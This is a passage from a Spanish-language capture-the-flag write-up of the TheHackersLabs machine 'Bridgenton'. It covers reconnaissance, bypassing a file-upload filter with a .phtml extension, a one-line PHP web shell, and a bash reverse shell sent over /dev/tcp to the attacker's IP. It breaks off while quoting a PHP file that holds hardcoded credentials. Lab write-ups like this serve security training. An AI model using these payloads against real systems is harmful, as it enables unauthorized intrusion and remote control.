<!doctype html><html lang=es><head><title>THL Bridgenton WriteUp ¬∑ gunzf0x
</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="gunzf0x"><meta name=description content="TheHackersLabs 'Bridgenton' WriteUp"><meta name=keywords content="blog,pentesting,hacking"><meta name=twitter:card content="summary"><meta name=twitter:title content="THL Bridgenton WriteUp"><meta name=twitter:description content="TheHackersLabs 'Bridgenton' WriteUp"><meta property="og:url" content="https://gunzf0x.github.io/pentesting/es/posts/bridgenton/"><meta property="og:site_name" content="gunzf0x"><meta property="og:title" content="THL Bridgenton WriteUp"><meta property="og:description" content="TheHackersLabs 'Bridgenton' WriteUp"><meta property="og:locale" content="es"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-09-08T00:00:00+00:00"><meta property="article:modified_time" content="2024-09-08T00:00:00+00:00"><meta property="article:tag" content="THL"><meta property="article:tag" content="Machine"><meta property="article:tag" content="Linux"><meta property="article:tag" content="Easy"><meta property="article:tag" content="Php"><meta property="article:tag" content="File Upload"><link rel=canonical href=https://gunzf0x.github.io/pentesting/es/posts/bridgenton/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/pentesting/css/coder.min.577e3c5ead537873430da16f0964b754a120fd87c4e2203a00686e7c75b51378.css integrity="sha256-V348Xq1TeHNDDaFvCWS3VKEg/YfE4iA6AGhufHW1E3g=" crossorigin=anonymous media=screen><link rel=stylesheet href=/pentesting/css/coder-dark.min.b587cb1f00f2309d3943f06d512873c8c174188c45cb8406de0bfe6523023297.css integrity="sha256-tYfLHwDyMJ05Q/BtUShzyMF0GIxFy4QG3gv+ZSMCMpc=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=any><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/pentesting/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/pentesting/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/pentesting/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/pentesting/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/pentesting/es>gunzf0x
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/pentesting/es/about/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/posts/>Blog/WriteUps</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/projects/>Proyectos</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/contact/>Contacto</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=/pentesting/posts/bridgenton/>üá¨üáß</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://gunzf0x.github.io/pentesting/es/posts/bridgenton/>THL Bridgenton WriteUp</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
<time datetime=2024-09-08T00:00:00Z>8 septiembre, 2024
</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
15 minutos de lectura.</span></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
<span class=tag><a href=/pentesting/es/tags/thl/>THL</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/machine/>Machine</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/linux/>Linux</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/easy/>Easy</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/php/>Php</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/file-upload/>File Upload</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/netcat/>Netcat</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/john/>John</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/library-hijacking/>Library Hijacking</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/gtfobins/>Gtfobins</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/gobuster/>Gobuster</a></span></div></div></header><div class=post-content><h1 id=bridgenton----thehackerslabs>Bridgenton &ndash; TheHackersLabs
<a class=heading-link href=#bridgenton----thehackerslabs><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1><ul><li>OS: <em>Linux</em></li><li>Difficulty / Dificultad: <em>Easy</em> / <em>F√°cil</em></li><li>Platform / Plataforma: <em>TheHackersLabs</em></li></ul><p><img alt="&lsquo;TheHackersLabs&rsquo; Avatar" src=/pentesting/images/TheHackersLabs_avatar.png></p><hr><h2 id=resumen>Resumen
<a class=heading-link href=#resumen><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p><code>Bridgenton</code> es una m√°quina f√°cil de la plataforma <code>TheHackerLabs</code>. Podemos ver que la m√°quina v√≠ctima est√° corriendo una p√°gina web la cual nos permite subir archivos. Luego de probar qu√© extensiones acepta esta p√°gina, somos capaces de encontrar una extensi√≥n la cual nos permite subir un archivo <code>PHP</code> malicioso y ganar as√≠ acceso inicial al sistema. Una vez dentro, somos capaces de ver un binari ocon permisos <code>SUID</code> inusuales, lo cual nos permite pivotear a otro usuario dentro del sistema. Este √∫ltimo usuario es capaz de ejecutar un script de <code>Python</code> con <code>sudo</code> como el usuario <code>root</code>, el cual es vulnerable a un <code>Library hijacking</code>; pudiendo as√≠ impersonar al usuario <code>root</code>.</p><hr><h2 id=user--usuario>User / Usuario
<a class=heading-link href=#user--usuario><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p>Empezando con un scan con <code>Nmap</code> muestra 2 puertos abiertos: <code>22</code> <code>SSH</code> y <code>80</code> <code>HTTP</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sS --open -p- --min-rate=5000 -n -Pn -vvv 10.20.1.125 -oG allPorts
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-02 18:58 -04
</span></span></span><span class=line><span class=cl><span class=go>Initiating ARP Ping Scan at 18:58
</span></span></span><span class=line><span class=cl><span class=go>Scanning 10.20.1.125 [1 port]
</span></span></span><span class=line><span class=cl><span class=go>Completed ARP Ping Scan at 18:58, 0.08s elapsed (1 total hosts)
</span></span></span><span class=line><span class=cl><span class=go>Initiating SYN Stealth Scan at 18:58
</span></span></span><span class=line><span class=cl><span class=go>Scanning 10.20.1.125 [65535 ports]
</span></span></span><span class=line><span class=cl><span class=go>Discovered open port 22/tcp on 10.20.1.125
</span></span></span><span class=line><span class=cl><span class=go>Discovered open port 80/tcp on 10.20.1.125
</span></span></span><span class=line><span class=cl><span class=go>Completed SYN Stealth Scan at 18:58, 2.54s elapsed (65535 total ports)
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.20.1.125
</span></span></span><span class=line><span class=cl><span class=go>Host is up, received arp-response (0.00055s latency).
</span></span></span><span class=line><span class=cl><span class=go>Scanned at 2024-09-02 18:58:54 -04 for 2s
</span></span></span><span class=line><span class=cl><span class=go>Not shown: 65533 closed tcp ports (reset)
</span></span></span><span class=line><span class=cl><span class=go>PORT   STATE SERVICE REASON
</span></span></span><span class=line><span class=cl><span class=go>22/tcp open  ssh     syn-ack ttl 64
</span></span></span><span class=line><span class=cl><span class=go>80/tcp open  http    syn-ack ttl 64
</span></span></span><span class=line><span class=cl><span class=go>MAC Address: 08:00:27:8D:CA:AA (Oracle VirtualBox virtual NIC)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Read data files from: /usr/bin/../share/nmap
</span></span></span><span class=line><span class=cl><span class=go>Nmap done: 1 IP address (1 host up) scanned in 2.90 seconds
</span></span></span><span class=line><span class=cl><span class=go>           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
</span></span></span></code></pre></div><p>Y chequeando las versiones de estos servicios junto con algunos scripts de reconocimiento con la flag <code>-sVC</code>, tenemos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sVC -p22,80 10.20.1.125 -oN targeted
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-02 18:59 -04
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.20.1.125
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.00080s latency).
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PORT   STATE SERVICE VERSION
</span></span></span><span class=line><span class=cl><span class=go>22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
</span></span></span><span class=line><span class=cl><span class=go>| ssh-hostkey:
</span></span></span><span class=line><span class=cl><span class=go>|   256 ad:fa:fa:1a:e7:99:65:1b:f9:e9:c4:55:be:f5:3a:f3 (ECDSA)
</span></span></span><span class=line><span class=cl><span class=go>|_  256 d7:87:d7:2e:d9:a3:4e:87:87:3d:b9:b8:ba:89:b5:fd (ED25519)
</span></span></span><span class=line><span class=cl><span class=go>80/tcp open  http    Apache httpd 2.4.57 ((Debian))
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Apache/2.4.57 (Debian)
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Universidad Bridgenton
</span></span></span><span class=line><span class=cl><span class=go>MAC Address: 08:00:27:8D:CA:AA (Oracle VirtualBox virtual NIC)
</span></span></span><span class=line><span class=cl><span class=go>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=go>Nmap done: 1 IP address (1 host up) scanned in 24.09 seconds
</span></span></span></code></pre></div><p>Aunque esto no muestra mucha info.</p><p>Visitando el sitio <code>HTTP</code> de la m√°quina v√≠ctima (<code>http://10.20.1.125</code> en mi caso) muestra una p√°gina web del portal de una universidad:</p><p><img alt="Bridgenton 1" src=/pentesting/images/Bridgenton_1.png></p><p>Muchos botones no funcionan. No obstante, los que est√°n en la parte central superior s√≠ lo hacen.</p><p>El bot√≥n de <code>Admisiones</code> nos permite crear una cuenta. Clickeando en √©ste nos redirige a <code>/registro.php</code>. Ahora podemos ver:</p><p><img alt="Bridgenton 2" src=/pentesting/images/Bridgenton_2.png></p><p>Si intento crear un usuario la p√°gina nos exige subir un archivo como imagen. De manera que subimos una imagen <code>.png</code> gen√©rica:</p><p><img alt="Bridgenton 3" src=/pentesting/images/Bridgenton_3.png></p><p>Pero cuando nos intentamos registar la p√°gina nos retorna un error:</p><p><img alt="Bridgenton 4" src=/pentesting/images/Bridgenton_4.png></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Error: Solo se permite cargar archivos con extensi√≥n .jpg, .jpeg, .png. Por favor, carga un archivo con una extensi√≥n v√°lida.
</span></span></code></pre></div><p>B√°sicamente, la p√°gina nos dice que la extensi√≥n que hemos provisto no es v√°lida a pesar de haber subido una imagen en formato <code>.png</code>.</p><p>Dado que la ruta para registrarse era <code>/registro.php</code>, esto puede significar que el servidor est√° corriendo utilizando <code>PHP</code> y, por tanto, podr√≠amos tratar de subir un archivo <code>PHP</code> malicioso. Podemos obtener una lista de extensiones para archivos de <a href=https://book.hacktricks.xyz/pentesting-web/file-upload#file-upload-general-methodology class=external-link target=_blank rel=noopener>HackTricks</a> o <a href=https://gitbook.seguranca-informatica.pt/cheat-sheet-1/web/file-upload-bypass class=external-link target=_blank rel=noopener>este blog</a> (ambos son b√°sicamente la misma lista) y la guardo en un archivo llamado <code>php_extensions_list.txt</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cat php_extensions_list.txt
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>.php
</span></span></span><span class=line><span class=cl><span class=go>.php2
</span></span></span><span class=line><span class=cl><span class=go>.php3
</span></span></span><span class=line><span class=cl><span class=go>.php4
</span></span></span><span class=line><span class=cl><span class=go>.php5
</span></span></span><span class=line><span class=cl><span class=go>.php6
</span></span></span><span class=line><span class=cl><span class=go>.php7
</span></span></span><span class=line><span class=cl><span class=go>.phps
</span></span></span><span class=line><span class=cl><span class=go>.phps
</span></span></span><span class=line><span class=cl><span class=go>.pht
</span></span></span><span class=line><span class=cl><span class=go>.phtm
</span></span></span><span class=line><span class=cl><span class=go>.phtml
</span></span></span><span class=line><span class=cl><span class=go>.pgif
</span></span></span><span class=line><span class=cl><span class=go>.shtml
</span></span></span><span class=line><span class=cl><span class=go>.htaccess
</span></span></span><span class=line><span class=cl><span class=go>.phar
</span></span></span><span class=line><span class=cl><span class=go>.inc
</span></span></span><span class=line><span class=cl><span class=go>.hphp
</span></span></span><span class=line><span class=cl><span class=go>.ctp
</span></span></span><span class=line><span class=cl><span class=go>.module
</span></span></span></code></pre></div><p>Lo que haremos ahora ser√° chequear qu√© aplicaciones son &ldquo;aceptadas&rdquo; por la aplicaci√≥n. Para esto abrimos <code>Burpsuite</code> e interceptamos la petici√≥n que se realiza al intentar registrar una cuenta al clickear en el bot√≥n <code>Registrarse</code> de la ruta <code>/registro.php</code>. Tenemos una petici√≥n como la que se muestra a continuaci√≥n:</p><p><img alt="Bridgenton 5" src=/pentesting/images/Bridgenton_5.png></p><p>Ahora, hago click derecho en esta petici√≥n y la mando al intruder haciendo click en <code>Send to Intruder</code>. Luego, vamos al la pesta√±a <code>Intruder</code> dentro de <code>Burpsuite</code>. All√≠, vamos a la pesta√±a <code>Payloads</code>, vamos a la secci√≥n <code>Payload settings</code>, clickeamos en <code>Load</code> y seleccionamos la lista generada con extensiones <code>PHP</code>:</p><p><img alt="Bridgenton 6" src=/pentesting/images/Bridgenton_6.png></p><p>Adicionalmente, al final de esta pesta√±a, quito la opci√≥n <code>URL-encode these characters</code>.</p><p>Luego, vamos a la pesta√±a <code>Positions</code> y localizamos la l√≠nea de la petici√≥n en donde se est√° mandando el archivo junto con su extensi√≥n:</p><p><img alt="Bridgenton 7" src=/pentesting/images/Bridgenton_7.png></p><p>Seleccionamos la extensi√≥n (<code>.png</code> in my case) y, al lado derecho, clickeo en <code>Add ¬ß</code>. Ahora esta l√≠nea se ve como:</p><p><img alt="Bridgenton 8" src=/pentesting/images/Bridgenton_8.png></p><p>Finalmente, clickeo en el bot√≥n <code>Start attack</code> localizado en la parte superior derecha. Una nueva ventana emergente aparece, como la siguiente:</p><p><img alt=Bridgenton src=/pentesting/images/Bridgenton_9.png></p><p>Si clickeamos en <code>Lenght</code> un par de veces, las peticiones se ordenen por <code>Response Length</code>, es decir, el tama√±o de la respuesta de la petici√≥n <code>HTTP</code> enviada. Puede que encontremos una respuesta que tenga un tama√±o diferente a la del resto y, por ende, pueda servirnos:</p><p><img alt="Bridgenton 10" src=/pentesting/images/Bridgenton_10.png></p><p>La petici√≥n con la extensi√≥n <code>.phtml</code> es diferente a las otras. Haciendo doble click en esta petici√≥n, y luego seleccionando la pesta√±a <code>Response</code>, muestra algo interesante:</p><p><img alt="Bridgenton 11" src=/pentesting/images/Bridgenton_11.png></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span> <span class=m>200</span> <span class=ne>OK</span>
</span></span><span class=line><span class=cl><span class=n>Date</span><span class=o>:</span> <span class=l>Tue, 03 Sep 2024 23:17:25 GMT</span>
</span></span><span class=line><span class=cl><span class=n>Server</span><span class=o>:</span> <span class=l>Apache/2.4.57 (Debian)</span>
</span></span><span class=line><span class=cl><span class=n>Vary</span><span class=o>:</span> <span class=l>Accept-Encoding</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>81</span>
</span></span><span class=line><span class=cl><span class=n>Keep-Alive</span><span class=o>:</span> <span class=l>timeout=5, max=100</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>Keep-Alive</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>text/html; charset=UTF-8</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Archivo cargado con √©xito. Bienvenido, gunzf0x, te has registrado correctamente.
</span></span></code></pre></div><p>Este mensaje en la respuesta significa que nuestro archibo ha sido subido. Ahora, crear√© un archivo <code>PHP</code> malicioso y lo llamar√© <code>image.phtml</code> con el siguiente contenido:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> <span class=nx>system</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;cmd&#39;</span><span class=p>]);</span> <span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></div><p>Ahora, de vuelta al sitio web, nos registramos con un usuario de nuevo y subimos como archivo <code>image.phtml</code>, la cual es en realidad nuestro archivo <code>PHP</code> malicioso:</p><p><img alt="Bridgenton 12" src=/pentesting/images/Bridgenton_12.png></p><div class="notice note"><div class=notice-title><i class="fa-solid fa-sticky-note" aria-hidden=true></i>Nota</div><div class=notice-content>Si no podemos ver nuestra imagen maliciosa a la hora de subirla, recordar cambiar la opci√≥n <code>All Supported Types</code> a <code>All Files</code> en la ventana/GUI que aparece para seleccionar la imagen a subir.</div></div><p>Clickeando en <code>Registrarse</code> somos capaces de registrar nuestra cuenta con el archivo malicioso exitosamente. ¬øPero d√≥nde se encuentra √©ste localizado? Podemos entonces tratar de listar directorios a trav√©s de un <code>Brute Force Directory Listing</code> con la herramienta <code>Gobuster</code> usando un diccionario de directorios del repositorio <code>SecLists</code>. Para esto, corremos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.20.1.125 -x php -t 55
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Gobuster v3.6
</span></span></span><span class=line><span class=cl><span class=go>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>[+] Url:                     http://10.20.1.125
</span></span></span><span class=line><span class=cl><span class=go>[+] Method:                  GET
</span></span></span><span class=line><span class=cl><span class=go>[+] Threads:                 55
</span></span></span><span class=line><span class=cl><span class=go>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
</span></span></span><span class=line><span class=cl><span class=go>[+] Negative Status codes:   404
</span></span></span><span class=line><span class=cl><span class=go>[+] User Agent:              gobuster/3.6
</span></span></span><span class=line><span class=cl><span class=go>[+] Extensions:              php
</span></span></span><span class=line><span class=cl><span class=go>[+] Timeout:                 10s
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Starting gobuster in directory enumeration mode
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>/login.php            (Status: 200) [Size: 2392]
</span></span></span><span class=line><span class=cl><span class=go>/uploads              (Status: 301) [Size: 312] [--&gt; http://10.20.1.125/uploads/]
</span></span></span><span class=line><span class=cl><span class=go>/.php                 (Status: 403) [Size: 276]
</span></span></span><span class=line><span class=cl><span class=go>/javascript           (Status: 301) [Size: 315] [--&gt; http://10.20.1.125/javascript/]
</span></span></span><span class=line><span class=cl><span class=go>/registrar.php        (Status: 200) [Size: 274]
</span></span></span><span class=line><span class=cl><span class=go>/registro.php         (Status: 200) [Size: 980]
</span></span></span><span class=line><span class=cl><span class=go>/.php                 (Status: 403) [Size: 276]
</span></span></span><span class=line><span class=cl><span class=go>/server-status        (Status: 403) [Size: 276]
</span></span></span><span class=line><span class=cl><span class=go>/bienvenida.php       (Status: 302) [Size: 0] [--&gt; login.php]
</span></span></span><span class=line><span class=cl><span class=go>Progress: 441120 / 441122 (100.00%)
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Finished
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span></code></pre></div><p>donde:</p><ul><li><code>dir</code> es el m√≥dulo de <code>Gobuster</code> para buscar por directorios.</li><li><code>-w</code> es el diccionario usado para la b√∫squeda.</li><li><code>-u</code> es la URL en donde queremos buscar los directorios/archivos.</li><li><code>-x</code> busca por archivos con extensi√≥n adem√°s de directorios. De manera que, por ejemplo, en este caso la b√∫squeda intentar√° encontrar los directorios <code>/example</code> y el archivo <code>example.php</code>.</li><li><code>-t</code> es el n√∫mero de hilos a usar para agilizar el proceso.</li></ul><p>Encontramos un directorio que se ve interesante llamado <code>/uploads</code>. Si visitamos <code>http://10.20.1.125/uploads</code> en neustro browser de internet puedo ver algo interesante:</p><p><img alt="Bridgenton 13" src=/pentesting/images/Bridgenton_13.png></p><p>Podemos entonces ahora visitar <code>http://10.20.1.125/uploads/image.phtml</code> y funciona (dado que no obtenemos <code>Error 404</code> o un error el cual indique que la p√°gina no existe).</p><div class="notice note"><div class=notice-title><i class="fa-solid fa-sticky-note" aria-hidden=true></i>Nota</div><div class=notice-content>Hay, aparentemente, un <code>cronjob</code> corriendo el cual remueve archivos del directorio <code>/uploads</code> cada cierto tiempo. De manera que si revisamos el directorio <code>/uploads</code> y nuestro archivo no est√° all√≠, puede que debamos de resubir nuestra imagen/archivo malicioso.</div></div><p>Ahora, podemos ver nuestra webshell visitando, por ejemplo, <code>http://10.20.1.125/uploads/image.phtml?cmd=id</code>. O podemos obtener exactamente el mismo resultado, pero desde nuestra terminal usando <code>cURL</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -s -X GET -G &#39;http://10.20.1.125/uploads/image.phtml&#39; --data-urlencode &#39;cmd=id&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span></span></span></code></pre></div><p>y funciona.</p><p>Ahora intentaremos obtener una reverse shell. Para esto, empezamos un listenre con <code>netcat</code> en el puerto <code>443</code> corriendo:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span></code></pre></div><p>y en nuestra webshell nos enviamos una reverse shell a nuestra m√°quina de atacante corriendo:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -s -X GET -G &#39;http://10.20.1.125/uploads/image.phtml&#39; --data-urlencode &#39;cmd=bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.20.1.110/443 0&gt;&amp;1&#34;&#39;
</span></span></span></code></pre></div><p>donde <code>10.20.1.110</code> es mi IP de atacante y <code>443</code> es el puerto en el cual ya me encuentro en escucha con <code>netcat</code>.</p><p>En nuestro listener obtenemos una shell como el usuario <code>www-data</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.20.1.110] from (UNKNOWN) [10.20.1.125] 38774
</span></span></span><span class=line><span class=cl><span class=go>bash: cannot set terminal process group (586): Inappropriate ioctl for device
</span></span></span><span class=line><span class=cl><span class=go>bash: no job control in this shell
</span></span></span><span class=line><span class=cl><span class=go>www-data@Bridgenton:/var/www/html/uploads$ whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go>www-data
</span></span></span></code></pre></div><p>Luego de buscar por archivos interesantes en el sistema soy capaz de ver un archivo llamado <code>procesar_registro.php</code> en el directorio <code>/var/www/html</code>. Podemos leer su contenido:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=c1>// Iniciar la sesi√≥n
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>session_start</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Verificar si se han enviado los datos del formulario
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span> <span class=p>(</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s2>&#34;REQUEST_METHOD&#34;</span><span class=p>]</span> <span class=o>==</span> <span class=s2>&#34;POST&#34;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Verificar que se hayan proporcionado un correo electr√≥nico y contrase√±a
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;email&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=c1>// Verificar las credenciales del usuario (aqu√≠ deber√≠as agregar tu l√≥gica de verificaci√≥n)
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nv>$email</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;email&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=nv>$password</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// Ejemplo b√°sico: verificar que el correo electr√≥nico sea &#34;james@thl.com&#34; y la contrase√±a sea &#34;bridgenton_200189&#34;
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>if</span> <span class=p>(</span><span class=nv>$email</span> <span class=o>===</span> <span class=s2>&#34;james@thl.com&#34;</span> <span class=o>&amp;&amp;</span> <span class=nv>$password</span> <span class=o>===</span> <span class=s2>&#34;bridgenton_200189&#34;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=c1>// Inicio de sesi√≥n exitoso
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=c1>// Establecer el correo electr√≥nico en la sesi√≥n
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;email&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$email</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=c1>// Redirigir al usuario a la p√°gina de bienvenida
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nx>header</span><span class=p>(</span><span class=s2>&#34;Location: bienvenida.php&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>exit</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=c1>// Credenciales incorrectas, mostrar un mensaje de error
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nv>$mensajeError</span> <span class=o>=</span> <span class=s2>&#34;Credenciales incorrectas. Por favor, int√©ntalo de nuevo.&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
